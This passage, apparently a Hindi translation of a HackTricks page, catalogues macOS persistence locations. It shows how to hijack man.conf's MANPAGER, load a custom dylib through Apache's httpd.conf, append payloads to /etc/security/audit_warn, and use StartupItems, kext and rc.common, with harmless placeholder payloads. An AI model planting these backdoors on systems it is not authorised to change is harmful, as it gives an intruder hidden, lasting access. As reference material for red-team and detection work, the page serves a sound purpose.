Config file **`/private/etc/man.conf`** उस binary/script को निर्दिष्ट करती है जिसका उपयोग man documentation files खोलते समय किया जाता है। इसलिए executable का path modify किया जा सकता है, ताकि user द्वारा कुछ docs पढ़ने के लिए man का उपयोग करते ही एक backdoor execute हो जाए।

उदाहरण के लिए **`/private/etc/man.conf`** में सेट करें:
```
MANPAGER /tmp/view
```
और फिर `/tmp/view` को इस प्रकार बनाएं:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए और apache running होना चाहिए
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Httpd के पास entitlements नहीं हैं

#### Location

- **`/etc/apache2/httpd.conf`**
- Root आवश्यक है
- Trigger: जब Apache2 शुरू किया जाता है

#### Description & Exploit

आप `/etc/apache2/httpd.conf` में एक line जोड़कर किसी module को load करने का संकेत दे सकते हैं, जैसे:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
इस तरह आपका compiled module Apache द्वारा load किया जाएगा। केवल इतना आवश्यक है कि या तो आप इसे **valid Apple certificate से sign करें**, या फिर system में **एक नया trusted certificate जोड़कर** इसे **उससे sign करें**।

फिर, यदि आवश्यक हो, तो यह सुनिश्चित करने के लिए कि server start हो जाए, आप यह execute कर सकते हैं:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylb के लिए Code example:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- sandbox bypass करने के लिए उपयोगी: [🟠](https://emojipedia.org/large-orange-circle)
- लेकिन आपको root होना चाहिए, auditd चल रहा होना चाहिए और एक warning उत्पन्न करनी होगी
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### स्थान

- **`/etc/security/audit_warn`**
- Root आवश्यक है
- **Trigger**: जब auditd किसी warning का पता लगाता है

#### विवरण और Exploit

जब भी auditd किसी warning का पता लगाता है, तो script **`/etc/security/audit_warn`** **executed** होती है। इसलिए आप इसमें अपना payload जोड़ सकते हैं।
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
आप `sudo audit -n` के साथ warning को force कर सकते हैं।

### Startup Items

> [!CAUTION] > **यह deprecated है, इसलिए उन directories में कुछ भी नहीं मिलना चाहिए।**

**StartupItem** एक directory है, जिसे `/Library/StartupItems/` या `/System/Library/StartupItems/` में से किसी एक के भीतर स्थित होना चाहिए। इस directory के स्थापित होने के बाद, इसमें दो specific files अवश्य होनी चाहिए:

1. एक **rc script**: startup पर execute होने वाली shell script।
2. एक **plist file**, जिसका नाम विशेष रूप से `StartupParameters.plist` होना चाहिए और जिसमें विभिन्न configuration settings होती हैं।

सुनिश्चित करें कि startup process द्वारा पहचानने और उपयोग करने के लिए rc script और `StartupParameters.plist` file दोनों **StartupItem** directory के अंदर सही ढंग से रखी गई हों।

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> मुझे अपने macOS में यह component नहीं मिला, इसलिए अधिक जानकारी के लिए writeup देखें।

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Apple द्वारा introduced, **emond** एक logging mechanism है जो underdeveloped या संभवतः abandoned प्रतीत होता है, फिर भी accessible बना हुआ है। Mac administrator के लिए यह विशेष रूप से लाभदायक नहीं है, लेकिन यह obscure service threat actors के लिए एक subtle persistence method के रूप में काम कर सकती है, जिस पर अधिकांश macOS admins का ध्यान संभवतः नहीं जाएगा।

जो लोग इसके अस्तित्व से परिचित हैं, उनके लिए **emond** के किसी भी malicious usage की पहचान करना straightforward है। इस service का system LaunchDaemon scripts को execute करने के लिए एक single directory में खोजता है। इसका निरीक्षण करने के लिए निम्न command का उपयोग किया जा सकता है:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### स्थान

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root आवश्यक
- **Trigger**: XQuartz के साथ

#### विवरण और Exploit

XQuartz अब **macOS में install नहीं होता**, इसलिए अधिक जानकारी के लिए Writeup देखें।

### ~~kext~~

> [!CAUTION]
> Root के रूप में भी kext install करना इतना जटिल है कि मैं इसे sandboxes से escape करने या persistence के लिए उपयोगी नहीं मानूंगा (जब तक आपके पास कोई exploit न हो)

#### स्थान

KEXT को startup item के रूप में install करने के लिए, इसे **निम्नलिखित में से किसी एक location में install** करना आवश्यक है:

- `/System/Library/Extensions`
- OS X operating system में built-in KEXT files।
- `/Library/Extensions`
- 3rd party software द्वारा install की गई KEXT files

आप वर्तमान में loaded kext files को इस प्रकार list कर सकते हैं:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
अधिक जानकारी के लिए [**kernel extensions check this section**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers) देखें।

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### स्थान

- **`/usr/local/bin/amstoold`**
- Root आवश्यक

#### विवरण और Exploitation

Apparently, `/System/Library/LaunchAgents/com.apple.amstoold.plist` की `plist` इस binary का उपयोग कर रही थी और एक XPC service expose कर रही थी... समस्या यह थी कि binary मौजूद नहीं थी, इसलिए आप वहां कुछ रख सकते थे और जब XPC service को call किया जाता, तो आपकी binary call होती।

अब मुझे यह अपने macOS में नहीं मिल रही है।

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### स्थान

- **`/Library/Preferences/Xsan/.xsanrc`**
- Root आवश्यक
- **Trigger**: जब service run की जाती है (बहुत कम)

#### विवरण और exploit

Apparently, इस script को run करना बहुत common नहीं है और मुझे यह अपने macOS में भी नहीं मिली, इसलिए अधिक जानकारी के लिए writeup देखें।

### ~~/etc/rc.common~~

> [!CAUTION] > **यह modern MacOS versions में काम नहीं करता**

यहां **ऐसे commands रखना भी संभव है जिन्हें startup पर execute किया जाएगा।** सामान्य rc.common script के उदाहरण के रूप में:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistence तकनीकें और tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## संदर्भ

- [2025, Infostealer का वर्ष](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)

{{#include ../banners/hacktricks-training.md}}
